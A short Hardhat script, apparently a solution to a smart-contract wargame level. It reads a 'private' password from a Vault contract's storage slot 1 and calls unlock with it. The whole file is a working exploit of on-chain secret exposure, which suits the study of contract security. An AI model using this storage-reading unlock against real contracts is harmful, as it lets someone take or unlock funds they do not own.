import "@nomiclabs/hardhat-waffle";
import {ethers} from "hardhat";
import utils from "web3-utils";
import hre from "hardhat";
import Web3 from "web3";

async function main() {
    const prov = hre.ethers.getDefaultProvider(process.env.ALCHEMY_API);
    const [owner] = await ethers.getSigners();
    console.log("Owner", owner.address);

    const vaultFactory = await ethers.getContractFactory("Vault");
    const vault = await vaultFactory.attach("0xB0a0B641cA657e20836f287d8b94f8C9728d9B78");
    console.log("Vault Address: ", vault.address)
    const storage = await prov.getStorageAt(vault.address, 1);
    console.log("Password: ", storage)
    const tx = await vault.unlock(storage);
    await tx.wait();
    console.log("TX hash: ", tx.hash);
  }
  
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });
  